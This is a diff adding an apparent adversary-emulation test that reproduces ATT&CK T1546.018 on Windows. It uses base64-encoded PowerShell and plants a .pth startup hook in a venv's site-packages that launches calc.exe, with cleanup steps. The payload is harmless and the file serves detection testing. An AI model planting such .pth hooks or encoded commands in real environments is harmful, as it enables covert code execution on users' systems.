@@ -1,0 +1,29 @@
+- id: eb7a6dd6-40d3-5b31-ade1-b41e3737ea47
+  name: Soumaia ART Tests - Python Startup Hook - atomic_hook.pth (Windows)
+  description: "Executes code by placing a .pth file in the site-packages directory. \nSupports python.exe and python3.exe via input arguments."
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIABAACgAIgBwAHkAdABoAG8AbgAuAGUAeABlACIALAAgACcAcAB5AHQAaABvAG4AMwAuAGUAeABlACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACAAewAgAGUAeABpAHQAIAAwACAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWwAhAF0AIABQAHkAdABoAG8AbgAzACAAbgBvAHQAIABmAG8AdQBuAGQALgAgAFAAbABlAGEAcwBlACAAaQBuAHMAdABhAGwAbAAgAFAAeQB0AGgAbwBuADMAIAAoAGUALgBnAC4ALAAgAHcAaQBuAGcAZQB0ACAAaQBuAHMAdABhAGwAbAAgAHAAeQB0AGgAbwBuADMAIABvAHIAIAB3AGkAbgBnAGUAdAAgAGkAbgBzAHQAYQBsAGwAIABwAHkAdABoAG8AbgAgAG8AcgAgAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHAAeQB0AGgAbwBuAC4AbwByAGcALwBkAG8AdwBuAGwAbwBhAGQAcwAvAHcAaQBuAGQAbwB3AHMALwApACAAbwByACAAZQBuAHMAdQByAGUAIABpAHQAIABpAHMAIABpAG4AIAB5AG8AdQByACAAUABBAFQASAAuACIACgA=
+          }
+          $TempDir = Join-Path $env:TEMP "atomic_pth_win"
+          New-Item -ItemType Directory -Path $TempDir -Force
+          & "python.exe" -m venv "$TempDir\env"
+          $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])"
+          "import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth"
+          Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth" }
+          & "$TempDir\env\Scripts\python.exe" -c "print('Triggering Hook via atomic_hook...')"
+        cleanup: |-
+          if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'atomic_pth_win')) { Write-Host "[!] Artifact missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 };
+          Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse -Force
+          Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth from Temp Directory"
+          Get-Process -Name "Calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Get-Process -Name "calc*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Write-Host "[+] Successfully Terminated Calculator"
